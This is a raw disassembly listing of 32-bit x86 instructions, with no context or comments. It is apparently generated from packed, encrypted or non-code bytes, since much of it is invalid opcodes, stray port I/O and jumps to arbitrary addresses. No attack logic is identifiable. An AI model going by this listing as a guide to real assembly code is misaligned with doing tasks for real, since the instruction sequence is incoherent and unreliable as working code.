  4072d8:	pop    ss
  4072d9:	fisubr DWORD PTR [eax+eax*8-0x6c36f48]
  4072e0:	adc    eax,0x64500a23
  4072e5:	adc    al,0xb7
  4072e7:	and    esp,edx
  4072e9:	ret    
  4072ea:	lds    ebx,FWORD PTR [ecx+0x72]
  4072ed:	mov    es,WORD PTR [eax-0x31]
  4072f0:	out    0xb5,al
  4072f2:	call   0x112a82eb
  4072f7:	icebp  
  4072f8:	pop    es
  4072f9:	jns    0x407317
  4072fb:	xor    ecx,DWORD PTR ds:0xc0d6a931
  407301:	pop    edx
  407302:	gs inc ecx
  407304:	int3   
  407305:	sbb    BYTE PTR [esp+0xbe884e4],al
  40730c:	add    bh,BYTE PTR [edi+0x4b]
  40730f:	sbb    cl,BYTE PTR [edi+0x3c]
  407312:	dec    esi
  407313:	js     0x4072a6
  407315:	pop    ss
  407316:	clc    
  407317:	iret   
  407318:	ja     0x40737a
  40731a:	mov    es,WORD PTR [ebx]
  40731c:	jns    0x407365
  40731e:	or     dl,dl
  407320:	dec    eax
  407321:	(bad)  
  407322:	pop    esp
  407323:	mov    eax,ds:0x68886132
  407328:	mov    ds:0x802d3a6d,al
  40732d:	push   cs
  40732e:	mov    ah,0x48
  407330:	call   0x8eca:0x5b48d91c
  407337:	jno    0x40738d
  407339:	scas   al,BYTE PTR es:[edi]
  40733a:	and    BYTE PTR [ebx+eiz*2+0x4dc9cc99],0xac
  407342:	dec    ebp
  407343:	enter  0x2062,0xbe
  407347:	scas   al,BYTE PTR es:[edi]
  407348:	sbb    eax,0xd53cee2
  40734d:	jle    0x40731d
  40734f:	(bad)  
  407350:	cld    
  407351:	push   edi
  407352:	dec    esi
  407353:	outs   dx,BYTE PTR ds:[esi]
  407354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407355:	nop
  407356:	test   al,0xd4
  407358:	add    BYTE PTR [ebp+0x4b540b1f],cl
  40735e:	mov    al,ds:0x7590bf4
  407363:	adc    al,0x7f
  407365:	addr16 enter 0x184b,0xa0
  40736a:	cld    
  40736b:	mov    fs,WORD PTR [ebp+ecx*4-0x346f0003]
  407372:	mov    ecx,ecx
  407374:	mov    eax,ds:0xc4cae739
  407379:	dec    esi
  40737a:	mov    DWORD PTR [ebp+ecx*2-0x6e781d41],0x6dc1d102
  407385:	out    dx,eax
  407386:	bnd jo 0x4073be
  407389:	pop    ebx
  40738a:	inc    DWORD PTR [eax]
  40738c:	xchg   ebp,eax
  40738d:	xor    al,0x84
  40738f:	ror    al,0x69
  407392:	jmp    0x7c0df34
  407397:	std    
  407398:	and    eax,edx
  40739a:	ror    DWORD PTR [ebx-0x5d],cl
  40739d:	xlat   BYTE PTR ds:[ebx]
  40739e:	cmc    
  40739f:	ror    DWORD PTR [ecx-0xc91e51],1
  4073a5:	scas   al,BYTE PTR es:[edi]
  4073a6:	pusha  
  4073a7:	ins    BYTE PTR es:[edi],dx
  4073a8:	xchg   esi,eax
  4073a9:	adc    BYTE PTR [eax+0x25],dl
  4073ac:	mov    ch,0x94
  4073ae:	cdq    
  4073af:	xchg   ebp,eax
  4073b0:	or     al,0x9a
  4073b2:	adc    al,dh
  4073b4:	out    dx,al
  4073b5:	jnp    0x4073a3
  4073b7:	mov    ch,0x43
  4073b9:	retf   0x3dc
  4073bc:	fdiv   st(4),st
  4073be:	mov    ds:0xdfbcc74,al
  4073c3:	mul    DWORD PTR [esi]
  4073c5:	retf   
  4073c6:	and    ebx,DWORD PTR [esi-0x4cd06f54]
  4073cc:	out    dx,al
  4073cd:	(bad)  
  4073ce:	mov    ds:0x78e60f5a,al
  4073d3:	xchg   BYTE PTR [eax-0x36ba24d0],ch
  4073d9:	push   esi
  4073da:	adc    eax,0x6abc29f2
  4073df:	mov    edx,0x85cb3b26
  4073e4:	jmp    0x73a1:0xe0bbdf28
  4073eb:	push   0x7691a71b
  4073f0:	jb     0x40739e
  4073f2:	jne    0x4073e4
  4073f4:	repnz imul edx,DWORD PTR [edi],0x26
  4073f8:	xchg   ebx,eax
  4073f9:	mov    edi,0xd30b170f
  4073fe:	fmul   st,st(3)
  407400:	or     edx,ebp
  407402:	test   al,0xd2
  407404:	loop   0x40740f
  407406:	pop    edi
  407407:	pop    es
  407408:	loopne 0x40747d
  40740a:	dec    esi
  40740b:	and    BYTE PTR [ecx+0x20],bh
  40740e:	push   esp
  40740f:	cmp    al,0xdd
  407411:	in     eax,dx
  407412:	scas   eax,DWORD PTR es:[edi]
  407413:	nop
  407414:	jg     0x407424
  407416:	fidivr DWORD PTR [ecx+esi*2-0x16]
  40741a:	cli    
  40741b:	adc    al,0x26
  40741d:	add    eax,0xb1ac542
  407422:	xor    al,0x74
  407424:	mov    ebp,0x32c1bee
  407429:	jnp    0x4073b0
  40742b:	test   DWORD PTR [esi],ebx
  40742d:	sbb    eax,0xcf6bb871
  407432:	cmp    DWORD PTR [edi],ebx
  407434:	dec    ecx
  407435:	jmp    0x407464
  407437:	fyl2xp1 
  407439:	mov    al,0xff
  40743b:	bound  esi,QWORD PTR [edx-0x3c]
  40743e:	inc    edi
  40743f:	test   DWORD PTR ds:0x6d014e41,edi
  407445:	dec    edx
  407446:	mov    ch,0x6c
  407448:	loop   0x40744d
  40744a:	xchg   ebx,eax
  40744b:	xlat   BYTE PTR ds:[ebx]
  40744c:	leave  
  40744d:	jbe    0x407458
  40744f:	gs repz lahf 
  407452:	test   DWORD PTR [edi+0x65],0x288b1833
  407459:	out    0xd2,al
  40745b:	push   ecx
  40745c:	and    DWORD PTR [eax-0x4f],esp
  40745f:	xchg   edx,eax
  407460:	jge    0x407420
  407462:	jge    0x407461
  407464:	sub    bh,BYTE PTR [edi+0x4e]
  407467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407468:	xor    BYTE PTR [ebp+ebx*4+0x13],al
  40746c:	jno    0x4074e7
  40746e:	clc    
  40746f:	es in  eax,dx
  407471:	ficom  WORD PTR [ecx]
  407473:	push   esi
  407474:	cmp    al,0x24
  407476:	pop    edx
  407477:	xor    ch,dh
  407479:	(bad)  
  40747a:	out    0x15,eax
  40747c:	fld    QWORD PTR [ebx+0x534a3ff4]
  407482:	(bad)  
  407484:	xchg   ebx,eax
  407485:	ins    BYTE PTR es:[edi],dx
  407486:	xchg   edx,eax
  407487:	jne    0x407481
  407489:	pop    edx
  40748a:	inc    edi
  40748b:	ins    DWORD PTR es:[edi],dx
  40748c:	push   esp
  40748d:	and    esi,DWORD PTR [ebx+0x2e]
  407490:	lds    edi,FWORD PTR [eax+0x32ea2]
  407496:	xor    ebp,edi
  407498:	mov    ebp,0xf39e1b5d
  40749d:	pop    ds
  40749e:	pusha  
  40749f:	aas    
  4074a0:	in     eax,dx
  4074a1:	(bad)  
  4074a2:	mov    esi,DWORD PTR [edx-0x6]
  4074a5:	sahf   
  4074a6:	fwait
  4074a7:	lea    esi,[esi+ebx*2]
  4074aa:	sub    eax,0x2e14eaa8
  4074af:	dec    edi
  4074b0:	adc    BYTE PTR [ebp-0x4],dl
  4074b3:	add    esp,DWORD PTR [edi+0x50648806]
  4074b9:	cs mov ebp,0x1ceadd5a
  4074bf:	fnstenv [ecx-0x21]
  4074c2:	mov    esi,0xc3b13549
  4074c7:	aad    0xdd
  4074c9:	sar    BYTE PTR [ecx],0x49
  4074cc:	(bad)  
  4074cd:	ds je  0x4074c1
  4074d0:	mov    bl,0xba
  4074d2:	test   cl,ah
  4074d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074d5:	into   
  4074d6:	sti    
  4074d7:	pop    esi
  4074d8:	cmp    ecx,DWORD PTR [ecx]
  4074da:	(bad)  
  4074db:	cmp    ah,BYTE PTR [edx-0x38be5d58]
  4074e1:	in     al,0x97
  4074e3:	ds cmc 
  4074e5:	ror    BYTE PTR [ebp-0x7b],cl
  4074e8:	inc    ebp
  4074e9:	idiv   DWORD PTR [ebp-0x6e]
  4074ec:	ins    DWORD PTR es:[edi],dx
  4074ed:	sbb    ebp,eax
  4074ef:	inc    ecx
  4074f0:	outs   dx,BYTE PTR ds:[esi]
  4074f1:	ins    DWORD PTR es:[edi],dx
  4074f2:	xchg   ebp,eax
  4074f3:	retf   
  4074f4:	jae    0x4074ac
  4074f6:	jae    0x407502
  4074f8:	xor    al,0xa6
  4074fa:	fstp   QWORD PTR [edi-0x4c]
  4074fd:	test   dh,bh
  4074ff:	js     0x407528
  407501:	xchg   esp,eax
  407502:	cmp    al,0xd
  407504:	cmc    
  407505:	shr    DWORD PTR [eax+0x1e],1
  407508:	stos   BYTE PTR es:[edi],al
  407509:	int    0xf4
  40750b:	mov    DWORD PTR [edi],esp
  40750d:	jae    0x4074e6
  40750f:	sub    edi,ebp
  407511:	add    eax,0x1c86d314
  407516:	mov    edx,0xb81241e2
  40751b:	or     eax,0xb60fe1af
  407520:	les    eax,FWORD PTR [eax-0x5d]
  407523:	add    ebp,DWORD PTR [edi]
  407525:	ficomp DWORD PTR ds:0xae444abc
  40752b:	cmc    
  40752c:	out    dx,eax
  40752d:	cs push eax
  40752f:	test   eax,0x81f34e66
  407534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407535:	mov    esp,0x4eec2f19
  40753a:	xor    al,0xe3
  40753c:	and    ch,bh
  40753e:	jmp    0x407558
  407540:	sbb    al,0xa7
  407542:	sbb    al,0x97
  407544:	mov    ds:0xcd57b866,eax
  407549:	push   edx
  40754a:	dec    ebp
  40754b:	jbe    0x407576
  40754d:	add    dl,bl
  40754f:	sbb    ebx,DWORD PTR [ebp-0xbcc3d13]
  407555:	jmp    0xf7b8233e
  40755a:	cmp    DWORD PTR [edx+0x21a0f6af],eax
  407560:	pop    ds
  407561:	shr    BYTE PTR [edx+ebp*8],cl
  407564:	mul    BYTE PTR [ebx+0x294c38ce]
  40756a:	adc    ebx,DWORD PTR [eax-0x13d4360c]
  407570:	mov    dh,0xfd
  407572:	call   0xfc67d1cd
  407577:	jbe    0x407587
  407579:	cmp    al,dl
  40757b:	push   es
  40757c:	pushf  
  40757d:	(bad)  
  40757e:	(bad)  
  40757f:	daa    
  407580:	add    DWORD PTR [eax],edx
  407582:	jl     0x407575
  407584:	scas   eax,DWORD PTR es:[edi]
  407585:	cmc    
  407586:	inc    ecx
  407587:	add    eax,0x6bd075ae
  40758c:	jnp    0x407545
  40758e:	das    
  40758f:	je     0x407515
  407591:	push   cs
  407592:	scas   al,BYTE PTR es:[edi]
  407593:	mov    ecx,0x3d428667
  407598:	fnstsw WORD PTR [ebx-0x49042c2]
  40759e:	push   es
  40759f:	lods   al,BYTE PTR ds:[esi]
  4075a0:	push   ss
  4075a1:	xchg   esp,eax
  4075a2:	dec    eax
  4075a3:	or     eax,DWORD PTR [edx]
  4075a5:	pop    es
  4075a6:	jns    0x40754f
  4075a8:	or     eax,0xf1c965d9
  4075ad:	and    edi,DWORD PTR [esi-0x18ef1fa4]
  4075b3:	outs   dx,DWORD PTR ds:[esi]
  4075b4:	mov    edx,0x644fbfe5
  4075b9:	ja     0x4075f9
  4075bb:	mov    dh,0x9
  4075bd:	sbb    eax,0x14be96c1
  4075c2:	scas   eax,DWORD PTR es:[edi]
  4075c3:	pop    ebp
  4075c4:	sbb    ah,BYTE PTR [edx]
  4075c6:	xchg   ecx,eax
  4075c7:	sbb    edx,edx
  4075c9:	xchg   ecx,eax
  4075ca:	sbb    eax,esp
  4075cc:	fcmove st,st(5)
  4075ce:	pop    eax
  4075cf:	xchg   edx,eax
  4075d0:	mov    bh,0x9b
  4075d2:	add    BYTE PTR [ebp-0x45],dh
  4075d5:	adc    DWORD PTR [ecx+0x33493181],esi
  4075db:	fcomp  QWORD PTR [edi-0x61]
  4075de:	and    eax,0x22390164
  4075e3:	in     eax,0xbd
  4075e5:	pop    esp
  4075e6:	sub    DWORD PTR [edx-0x79722f35],ebp
  4075ec:	inc    ebx
  4075ed:	push   ds
  4075ee:	pop    eax
  4075ef:	je     0x407620
  4075f1:	lahf   
  4075f2:	out    0x13,eax
  4075f4:	push   0xfffffffd
  4075f6:	dec    edx
  4075f7:	pop    ebx
  4075f8:	push   esp
  4075f9:	jno    0x407595
  4075fb:	fdivr  DWORD PTR [edx+eax*1]
  4075fe:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407600:	jnp    0x40759d
  407602:	inc    edi
  407603:	and    ch,bh
  407605:	test   BYTE PTR [ebx-0x26611d38],bl
  40760b:	and    edi,DWORD PTR [eax]
  40760d:	shl    ebp,1
  40760f:	in     eax,dx
  407610:	cmp    al,0x2b
  407612:	aas    
  407613:	ret    0x1c16
  407616:	loope  0x407644
  407618:	jnp    0x407626
  40761a:	retf   
  40761b:	test   al,0xe5
  40761d:	test   al,0x69
  40761f:	shl    DWORD PTR [edx],0x86
  407622:	ins    DWORD PTR es:[edi],dx
  407623:	jge    0x407632
  407625:	adc    eax,0xe49f9fd6
  40762a:	daa    
  40762b:	dec    esi
  40762c:	dec    edi
  40762d:	adc    edx,DWORD PTR [edi+0x64]
  407630:	loope  0x40769c
  407632:	ja     0x407651
  407634:	call   0x62be:0xc8b0a488
  40763b:	loop   0x4075e4
  40763d:	repz adc esp,edx
  407640:	or     dh,bh
  407642:	retf   
  407643:	cmp    al,0x97
  407645:	push   esi
  407646:	in     eax,0x43
  407648:	pop    ecx
  407649:	add    eax,DWORD PTR [ecx-0x40]
  40764c:	call   0x77e5:0x493ac35f
  407653:	shl    ebp,1
  407655:	or     eax,0xb8d99847
  40765a:	icebp  
  40765b:	out    0x54,al
  40765d:	push   esp
  40765e:	lea    ebx,[esi]
  407660:	or     bh,al
  407662:	ret    
  407663:	test   edi,ebp
  407665:	or     al,0x2b
  407667:	fisttp DWORD PTR [ebx+eiz*4-0x6ffbd4ce]
  40766e:	inc    ebx
  40766f:	inc    ecx
  407670:	fnstcw WORD PTR [ecx+0x5e]
  407673:	(bad)  
  407674:	xchg   ebx,eax
  407675:	inc    esi
  407676:	xchg   esi,eax
  407677:	outs   dx,BYTE PTR ds:[esi]
  407678:	and    al,0xdb
  40767a:	aas    
  40767b:	xchg   BYTE PTR cs:[edi],bl
  40767e:	arpl   dx,di
  407680:	push   ecx
  407681:	enter  0x6828,0x49
  407685:	ss ret 0x17f8
  407689:	xchg   edi,ecx
  40768b:	inc    ecx
  40768c:	dec    esi
  40768d:	sbb    BYTE PTR [edi],bl
  40768f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407690:	inc    esi
  407691:	xchg   BYTE PTR fs:[esp-0x1c],dl
  407696:	inc    edi
  407697:	ins    BYTE PTR es:[edi],dx
  407698:	xchg   ebx,eax
  407699:	dec    eax
  40769a:	inc    BYTE PTR [edi]
  40769c:	stos   DWORD PTR es:[edi],eax
  40769d:	pop    ebx
  40769e:	stos   DWORD PTR es:[edi],eax
  40769f:	xor    BYTE PTR [edi+0x2a],bl
  4076a2:	pop    ecx
  4076a3:	stc    
  4076a4:	leave  
  4076a5:	idiv   DWORD PTR [edi+0x19]
  4076a8:	and    eax,DWORD PTR [ecx]
  4076aa:	xchg   edi,eax
  4076ab:	mov    edx,0xbf4a9790
  4076b0:	or     eax,0x6d1bd1bb
  4076b5:	(bad)  
  4076b6:	mov    eax,ds:0x5d638f08
  4076bb:	ja     0x40773b
  4076bd:	nop
  4076be:	frstor [esi]
  4076c0:	cmp    al,BYTE PTR [ebp-0x71]
  4076c3:	retf   
  4076c4:	loope  0x407663
  4076c6:	xor    esi,DWORD PTR [ebp-0x456bb075]
  4076cc:	or     BYTE PTR [ebp-0x16e38a9],ah
  4076d2:	in     eax,dx
  4076d3:	jae    0x4076ef
  4076d5:	pop    ds
  4076d6:	and    al,0x15
  4076d8:	pop    ebx
  4076d9:	imul   ecx,eax,0xffffffa4
  4076dc:	xor    DWORD PTR [ebp-0x4bb2cb44],0xb7cfbbc9
  4076e6:	inc    edx
  4076e7:	int    0x2a
  4076e9:	shr    esp,0xc6
  4076ec:	push   eax
  4076ed:	or     eax,0x64256bce
  4076f2:	fucomp st(3)
  4076f4:	pop    edi
  4076f5:	push   edx
  4076f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076f7:	push   edi
  4076f8:	mov    ch,0x1d
  4076fa:	sar    DWORD PTR [eax-0x6c],cl
  4076fd:	push   cs
  4076fe:	push   eax
  4076ff:	inc    edi
  407700:	or     al,0x72
  407702:	les    esp,FWORD PTR [eax-0x6d89b52e]
  407708:	call   DWORD PTR [eax-0x39f5e0e5]
  40770e:	mov    ds:0x4e0af6be,al
  407713:	clc    
  407714:	mov    eax,ds:0x4d9ac0b0
  407719:	aaa    
  40771a:	(bad)  
  40771b:	cmp    eax,0x3e5f706a
  407720:	pusha  
  407721:	xchg   ecx,eax
  407722:	pop    ebx
  407723:	mov    esi,0x7fd79e88
  407728:	repz (bad) 
  40772a:	(bad)  
  40772b:	or     BYTE PTR [edi],al
  40772d:	scas   al,BYTE PTR es:[edi]
  40772e:	or     dh,BYTE PTR [esi+eiz*8]
  407731:	cli    
  407732:	shr    ecx,0xcf
  407735:	add    BYTE PTR [esi+0x39],al
  407738:	mov    ds:0x8205d2ce,al
  40773d:	dec    esi
  40773e:	jmp    0x95cbf260
  407743:	mov    ebx,0x5a0ce859
  407748:	and    al,0xd2
  40774a:	cmp    al,BYTE PTR [ebx-0x6df795db]
  407750:	jo     0x4076e8
  407752:	mov    eax,ds:0x7aa40088
  407757:	dec    ebp
  407758:	ret    
  407759:	jae    0x4076f6
  40775b:	xor    dl,BYTE PTR [ebp+0x2498adf1]
  407761:	fidivr WORD PTR [edx+0x5a7e8362]
  407767:	mov    al,ds:0xb0abe064
  40776c:	xchg   ebp,eax
  40776d:	dec    eax
  40776e:	xchg   ecx,eax
  40776f:	sub    BYTE PTR [ecx],ch
  407771:	arpl   WORD PTR [edx+edi*2-0x71a31593],di
  407778:	in     eax,0x87
  40777a:	sbb    eax,ebx
  40777c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40777d:	(bad)  
  40777e:	dec    eax
  40777f:	xchg   ebp,eax
  407780:	mov    es,WORD PTR [ebx]
  407782:	bound  esi,QWORD PTR [esi+0x4bcc25cc]
  407788:	test   eax,0x12757db7
  40778d:	repnz xchg ebp,eax
  40778f:	cmp    ebx,DWORD PTR [edi]
  407791:	mov    ebp,0x17cc2a7a
  407796:	mov    edx,0x26b8e903
  40779b:	sbb    al,0x21
  40779d:	pop    es
  40779e:	mov    bl,0xb0
  4077a0:	and    al,BYTE PTR ds:0x7cd065f4
  4077a6:	jmp    0x71fa0666
  4077ab:	xchg   ebx,eax
  4077ac:	pusha  
  4077ad:	(bad)  
  4077ae:	inc    edx
  4077af:	sbb    edx,DWORD PTR [esi-0x740584fc]
  4077b5:	jle    0x4077ab
  4077b7:	pop    ss
  4077b8:	xchg   edi,eax
  4077b9:	add    dl,BYTE PTR gs:[ecx]
  4077bc:	cs jne 0x40774e
  4077bf:	gs scas eax,DWORD PTR es:[edi]
  4077c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077c2:	(bad)  
  4077c3:	sbb    esi,esp
  4077c5:	outs   dx,BYTE PTR ds:[esi]
  4077c6:	sub    eax,DWORD PTR [edx+ebx*2]
  4077c9:	or     eax,0x535771ed
  4077ce:	out    dx,al
  4077cf:	ffree  st(4)
  4077d1:	xor    BYTE PTR [ebp+0x7c],al
  4077d4:	jge    0x407799
  4077d6:	xchg   cl,ch
  4077d8:	ss retf 0xdc53
  4077dc:	mov    ch,0xde
  4077de:	add    bh,BYTE PTR [edx+0x4e]
  4077e1:	pop    ds
  4077e2:	jmp    0xf7b3ae36
  4077e7:	aaa    
  4077e8:	repnz mov al,0x52
  4077eb:	test   al,0x3a
  4077ed:	inc    edx
  4077ee:	outs   dx,BYTE PTR ds:[esi]
  4077ef:	out    0xc1,eax
  4077f1:	push   0xffffff9e
  4077f3:	xor    ebx,DWORD PTR ss:[edi-0x6f]
  4077f7:	push   0xbf5c83b8
  4077fc:	jp     0x4077a4
  4077fe:	pushf  
  4077ff:	dec    ecx
  407800:	mov    DWORD PTR [ebx+0x2c],esi
  407803:	mov    ds:0xe2d3d15d,al
  407808:	rcr    DWORD PTR [ecx-0x14],1
  40780b:	mov    ah,0x74
  40780d:	inc    edi
  40780e:	test   BYTE PTR [edx+0x7f7eaccf],al
  407814:	adc    BYTE PTR [ebp-0x11],ch
  407817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407818:	jge    0x4077b4
  40781a:	leave  
  40781b:	mov    bl,0x4f
  40781d:	jno    0x4077e2
  40781f:	xchg   edi,eax
  407820:	xchg   ebx,eax
  407821:	push   eax
  407822:	sub    bl,BYTE PTR [edi-0x1a]
  407825:	sahf   
  407826:	inc    edx
  407827:	ja     0x4077ee
  407829:	lahf   
  40782a:	or     esi,edx
  40782c:	mov    ds:0x677cc750,al
  407831:	xor    eax,DWORD PTR [ecx-0x245c6ee7]
  407837:	call   0xce95:0x83a1d9ae
  40783e:	fbstp  TBYTE PTR [ecx]
  407840:	dec    edx
  407841:	xchg   esp,eax
  407842:	aas    
  407843:	cmc    
  407844:	mov    BYTE PTR [ebx-0x40],0x3e
  407848:	js     0x407800
  40784a:	mov    esp,0xac475034
  40784f:	mov    cl,0xf5
  407851:	adc    BYTE PTR [edx],ch
  407853:	push   eax
  407854:	jmp    0xfd16:0xdd04db24
  40785b:	sub    ebp,DWORD PTR [ebx]
  40785d:	or     ch,BYTE PTR [ebx+eiz*4+0x3da40669]
  407864:	adc    eax,0xca3a6c13
  407869:	jge    0x407852
  40786b:	lea    ecx,[edx+edi*8-0x1f]
  40786f:	lods   eax,DWORD PTR ds:[esi]
  407870:	jb     0x4078ac
  407872:	mov    edi,fs
  407874:	fst    QWORD PTR [ecx+eiz*8]
  407877:	div    BYTE PTR [esi]
  407879:	sbb    ebp,edi
  40787b:	inc    ebx
  40787c:	neg    cl
  40787e:	jb     0x407811
  407880:	and    eax,DWORD PTR [ecx-0xa]
  407883:	pop    edx
  407884:	or     al,0xc
  407886:	fimul  WORD PTR ds:[ebx+ebp*4+0x13]
  40788b:	repz test eax,0xc2ac4702
  407891:	dec    ecx
  407892:	and    esp,DWORD PTR [ebp+0x7e8b44fe]
  407898:	fwait
  407899:	adc    al,0x78
  40789b:	lods   al,BYTE PTR ds:[esi]
  40789c:	pop    ebp
  40789d:	es leave 
  40789f:	repz and al,0x14
  4078a2:	hlt    
  4078a3:	push   ds
  4078a4:	or     ah,BYTE PTR [eax+0x32]
  4078a7:	xchg   edx,eax
  4078a8:	push   es
  4078a9:	retf   
  4078aa:	(bad)  
  4078ab:	pop    ebx
  4078ac:	mov    eax,0x7eb2ad28
  4078b1:	arpl   ax,di
  4078b3:	sub    eax,0xb86c4491
  4078b8:	push   eax
  4078b9:	mov    cl,0x64
  4078bb:	inc    eax
  4078bc:	outs   dx,DWORD PTR ds:[esi]
  4078bd:	sub    al,0x26
  4078bf:	nop
  4078c0:	jae    0x4078ae
  4078c2:	pop    es
  4078c3:	lods   eax,DWORD PTR ds:[esi]
  4078c4:	dec    ecx
  4078c5:	lods   al,BYTE PTR ds:[esi]
  4078c6:	nop
  4078c7:	mov    edi,0x68ff6ccf
  4078cc:	ror    DWORD PTR [ebp+0x702057f],1
  4078d2:	adc    cl,BYTE PTR [edi+0x37]
  4078d5:	stos   BYTE PTR es:[edi],al
  4078d6:	pop    es
  4078d7:	cli    
  4078d8:	pop    ds
  4078d9:	imul   eax,DWORD PTR [edx+0x2b390af],0xffffffb7
  4078e0:	rcr    DWORD PTR [edx+0x7d052373],0x10
  4078e7:	and    DWORD PTR [ecx+0x6a10404],ebp
  4078ed:	mov    esp,0x181442e8
  4078f2:	in     eax,dx
  4078f3:	sub    BYTE PTR [edx+0x65df89c0],0xaf
  4078fa:	and    eax,0x47b2d244
  4078ff:	sub    ah,BYTE PTR [ebx]
  407901:	lea    esp,[ebx+0x76b2da43]
  407907:	push   ebx
  407908:	adc    ah,BYTE PTR [edi+0xe39d292]
  40790e:	cld    
  40790f:	sbb    BYTE PTR [edx],0x74
  407912:	fist   DWORD PTR [edi+0x45699c03]
  407918:	iret   
  407919:	scas   al,BYTE PTR es:[edi]
  40791a:	je     0x4078e5
  40791c:	xchg   esp,eax
  40791d:	sbb    BYTE PTR [edx],ah
  40791f:	or     eax,0x4bd3bad
  407924:	lock mov ebp,0x4414298f
  40792a:	nop
  40792b:	ror    BYTE PTR [ecx],cl
  40792d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40792e:	cmp    dh,BYTE PTR [eax+ecx*1+0x20]
  407932:	enter  0xd327,0x8d
  407936:	out    0x4f,al
  407938:	retf   
  407939:	rcr    edx,0x8f
  40793c:	ins    DWORD PTR es:[edi],dx
  40793d:	sar    DWORD PTR [ebp+0x4e],0x32
  407941:	imul   esp,DWORD PTR [esi],0xff2e035d
  407947:	jmp    0xffea:0x569e0bc4
  40794e:	in     al,dx
  40794f:	iret   
  407950:	lock jl 0x407906
  407953:	mov    ebp,0x10924e4c
  407958:	push   ss
  407959:	cmp    BYTE PTR [esi-0x4f983ccc],al
  40795f:	loop   0x40798a
  407961:	icebp  
  407962:	inc    edx
  407963:	push   esp
  407964:	daa    
  407965:	add    ebx,DWORD PTR [ecx-0x5c1f97cc]
  40796b:	call   0x6eca59f2
  407970:	out    0x9,eax
  407972:	repz and eax,0x4516f30d
  407978:	lods   eax,DWORD PTR ds:[esi]
  407979:	push   ecx
  40797a:	and    bh,bh
  40797c:	loopne 0x40792c
  40797e:	stc    
  40797f:	inc    eax
  407980:	cmp    bl,BYTE PTR [edi]
  407982:	or     dl,dh
  407984:	sbb    bl,ch
  407986:	sub    esi,DWORD PTR [edi+0x179f58aa]
  40798c:	adc    al,0xb7
  40798e:	fdiv   st,st(7)
  407990:	in     eax,dx
  407991:	in     eax,0xac
  407993:	ja     0x4079cc
  407995:	fdivr  DWORD PTR [edi+0x71afba3f]
  40799b:	jecxz  0x4079a4
  40799d:	mov    al,0x31
  40799f:	jb     0x407962
  4079a1:	(bad)  
  4079a2:	das    
  4079a3:	shl    DWORD PTR [eax+0x18],cl
  4079a6:	and    esi,DWORD PTR [esi-0x4b4efced]
  4079ac:	jne    0x407991
  4079ae:	add    DWORD PTR [esi+0x61636f59],0x6d
  4079b5:	xchg   ebp,eax
  4079b6:	js     0x407a21
  4079b8:	call   0x73f4f113
  4079bd:	jae    0x407a18
  4079bf:	daa    
  4079c0:	in     al,dx
  4079c1:	add    BYTE PTR [edi-0x4cbc96d7],bl
  4079c7:	cmp    al,bh
  4079c9:	call   0x7c250a69
  4079ce:	aas    
  4079cf:	cmp    eax,0x5ae36b0
  4079d4:	outs   dx,BYTE PTR ds:[esi]
  4079d5:	jmp    0xdf42cf07
  4079da:	out    0xae,al
  4079dc:	stos   BYTE PTR es:[edi],al
  4079dd:	in     al,0x4d
  4079df:	repz push edx
  4079e1:	idiv   BYTE PTR [esi-0x3bd9bdc2]
  4079e7:	call   0x6e55:0x5ee7cc81
  4079ee:	sbb    cl,bl
  4079f0:	repnz (bad) 
  4079f2:	mov    WORD PTR [ebx],ds
  4079f4:	mov    bl,0x21
  4079f6:	(bad)  
  4079f7:	mov    esi,0xbeca2491
  4079fc:	inc    esi
  4079fd:	and    eax,0xdc84d21
  407a02:	(bad)  
  407a03:	outs   dx,BYTE PTR ds:[esi]
  407a04:	ret    
  407a05:	add    eax,DWORD PTR [edi-0x38607619]
  407a0b:	aas    
  407a0c:	out    dx,al
  407a0d:	xor    eax,0xa12c9b2
  407a12:	or     al,0x21
  407a14:	in     eax,dx
  407a15:	bound  ebp,QWORD PTR [edx-0x78fab9ac]
  407a1b:	outs   dx,DWORD PTR ds:[esi]
  407a1c:	sub    eax,0x57fee8c2
  407a21:	fstp   DWORD PTR [esi-0x4d2632e7]
  407a27:	(bad)
  407a2a:	jmp    0x2278953c
  407a2f:	bound  esp,QWORD PTR [ebp-0x63]
  407a32:	call   0x443c:0x271bbcf
  407a39:	(bad)  
  407a3a:	hlt    
  407a3b:	adc    eax,0x41d498df
  407a41:	adc    bl,bh
  407a43:	imul   ecx,DWORD PTR [ecx+edi*4+0x6e547deb],0x94735c53
  407a4e:	pop    ss
  407a4f:	hlt    
  407a50:	pop    edi
  407a51:	add    BYTE PTR [edi-0x6],ch
  407a54:	pushf  
  407a55:	fisub  WORD PTR [ecx-0x26d43945]
  407a5b:	lds    eax,FWORD PTR [esi]
  407a5d:	scas   eax,DWORD PTR es:[edi]
  407a5e:	in     eax,0xc8
  407a60:	or     BYTE PTR [ecx-0x65fc7f44],0x8
  407a67:	les    ebp,FWORD PTR [esi+0x23]
  407a6a:	lahf   
  407a6b:	sub    BYTE PTR [eax-0x21],bl
  407a6e:	stc    
  407a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a71:	adc    eax,0x61af04d4
  407a76:	or     DWORD PTR [ebp-0x978270],eax
  407a7c:	lods   al,BYTE PTR ds:[esi]
  407a7d:	cld    
  407a7e:	out    0x3b,eax
  407a80:	arpl   WORD PTR [ebp-0x2a],dx
  407a83:	retf   0x3a1d
  407a86:	cdq    
  407a87:	shr    DWORD PTR [ebp+0x44db80db],1
  407a8d:	ds jae 0x407acd
  407a90:	iret   
  407a91:	push   ss
  407a92:	das    
  407a93:	adc    al,0xe8
  407a95:	jmp    0x95875f82
  407a9a:	ror    BYTE PTR [ebp+eax*4+0x13c77247],1
  407aa1:	dec    edi
  407aa2:	call   0x977ede48
  407aa7:	push   edx
  407aa8:	pop    es
  407aa9:	cli    
  407aaa:	mov    bl,0x1c
